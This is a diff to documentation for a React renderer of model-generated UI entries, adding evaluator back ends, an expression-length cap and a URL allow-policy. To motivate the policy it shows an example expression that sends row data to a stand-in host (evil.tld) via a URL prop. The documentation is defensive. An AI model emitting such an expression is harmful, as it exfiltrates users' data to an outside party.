@@ -75,8 +75,8 @@ To isolate documents instead, give each its own provider.
   your API. See [Host functions](/functions).
 - **`fallbackComponents`** *(optional)* — the engine's fallback UI; see
   [below](#fallbackcomponents--the-engines-fallback-ui).
-- **`allowGlobals`** *(optional)* — extra expression globals; see
-  [below](#allowglobals--extend-the-expression-allow-list).
+- **`evaluator`** *(optional)* — which expression back end runs documents under
+  this provider; see [below](#evaluator--interpret-or-native).
 - **`init`** *(optional)* — a one-shot side effect for the whole group: preload
   the state documents read, and optionally
   [expose extra named scopes](#extra-named-scopes) beyond `root`. See
@@ -228,27 +228,74 @@ it:
 
 Cancel and neither step runs — a `confirm` step is a barrier.
 
-### `allowGlobals` — extend the expression allow-list
+### `evaluator` — `interpret` or `native`
 
-Expressions may reference only a fixed
-[safe set of globals](/entry/expressions#safety). `allowGlobals` **adds** to
-it:
+Which back end runs every expression under this provider. The default,
+`"interpret"`, checks each read and call at run time and needs no CSP
+`unsafe-eval` — the choice for any document you did not author yourself.
 
 ```tsx
 <RendererProvider
   implementations={allImplementations}
-  allowGlobals={["structuredClone", "crypto"]}
+  evaluator="native"
 >
   <EntriesRenderer entries={entries} />
 </RendererProvider>;
 ```
 
-You also need to pass the same list to
-[`getExpressionsPartialPrompt`](/prompt), or the model is never told the names
-exist and will not use them.
+`"native"` validates against the same grammar and then runs the source with
+`new Function`: near-native speed, `unsafe-eval` required, and the
+[run-time-assembled key](/expr#two-modes) goes
+unchecked. Use it only for documents from a trusted author — your own
+pipeline, an admin. Both
+modes accept exactly the same language, so switching is a one-word change. See
+[Safety](/expr#two-modes).
 
-**Additive only.** It cannot re-enable the globals the engine shadows (`fetch`,
-`Function`, `setTimeout`, …). See [Safety](/entry/expressions#safety).
+### `maxExpressionLength` — cap expression size
+
+One expression may be at most this many characters — 1000 by default, rejected
+before parsing. Pass the same value to
+`getExpressionsPartialPrompt({ maxLength })` so the model is told the limit it
+generates under.
+
+### `urlPolicy` — the URLs a document may load
+
+A prop the definition declares as a URL (`z.url()`) is a destination the
+browser fetches on render — `<img src>` issues the GET with no interaction. An
+expression building
+`"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` is perfectly legal
+JavaScript, so the [evaluator](/expr) rightly allows it; the danger is
+the destination, and this policy gates it. The check runs after props parse
+and before the implementation sees them.
+
+Without configuration the policy is strict: **relative URLs, same-origin
+absolute URLs, raster `data:` images** (never SVG — it can carry script), and
+inert schemes (`mailto:`, `tel:`) pass; every other destination is rejected
+and the element renders the [error slot](#fallbackcomponents--the-engines-fallback-ui)
+instead.
+
+To allow more, pass an object or a predicate:
+
+```tsx
+<RendererProvider
+  implementations={allImplementations}
+  urlPolicy={{ hosts: ["cdn.example.com", "*.imgix.net"] }}
+>
+  <EntriesRenderer entries={entries} />
+</RendererProvider>;
+```
+
+| Field | Default | |
+| --- | --- | --- |
+| `allowRelative` | `true` | `/a`, `a/b`, `?q=1`, `#x` |
+| `allowSameOrigin` | `true` | Absolute URLs on the page origin |
+| `hosts` | `[]` | Extra hosts over http/https; `*.example.com` matches subdomains only |
+| `allowDataImages` | `true` | `data:` raster images; `image/svg+xml` stays out regardless |
+| `origin` | `location.origin` | Set explicitly where there is no `location` (SSR) |
+
+A function form — `urlPolicy={(url) => boolean}` — replaces the rules
+entirely. The rejection message names the failing prop and, when a host is the
+issue, the exact `hosts` entry that would allow it.
 
 ### `init` — preload state for the group
 
@@ -276,7 +323,7 @@ resolves.
 ### Extra named scopes
 
 `init` can also expose scopes beyond `root`. Build one with
-[`createProxyScope`](/api#uicastcore) above the provider — so you keep the
+[`createProxyScope`](/api-ref#uicastcore) above the provider — so you keep the
 handle — and assign it onto the `scopes` object `init` receives; it is present
 before any entry evaluates:
 
@@ -307,22 +354,20 @@ reason to inject a scope rather than just seed `scopes.root` in `init`: a living
 handle the host can drive from outside a document.
 
 **Tell the model it exists.** No prompt builder knows about a scope you inject,
-so a model never told about it will never emit `scopes.userCtx`. List it with
-`getExpressionsPartialPrompt`'s `extraScopes`:
+so a model never told about it will never emit `scopes.userCtx`. Declare it with
+`getCommonInstructionsPartialPrompt`'s `note`, rendered as a `## Note` right
+under the prompt's `# Expression Context` section:
 
 ```ts
-getExpressionsPartialPrompt({
-  extraScopes: [
-    { name: "userCtx", description: "the signed-in user: name (string), plan ('free' | 'pro'); read-only" },
-  ],
+getCommonInstructionsPartialPrompt({
+  note: "scopes.userCtx holds the signed-in user: name (string), plan ('free' | 'pro'); read-only.",
 });
 ```
 
-Nothing checks that the description and the object agree. Keep them in step
-yourself.
+Nothing checks that the note and the object agree. Keep them in step yourself.
 
 ## Where to go next
 
 - [Component implementation](/react/impl) — the `implementations` you pass in.
 - [Component Entry Format](/entry) — the `entries` the renderer mounts.
-- [JavaScript Expressions](/entry/expressions) — what runs inside an entry, and the allow-list `allowGlobals` extends.
+- [The expression evaluator](/expr) — what runs inside an entry, and the two evaluator back ends.
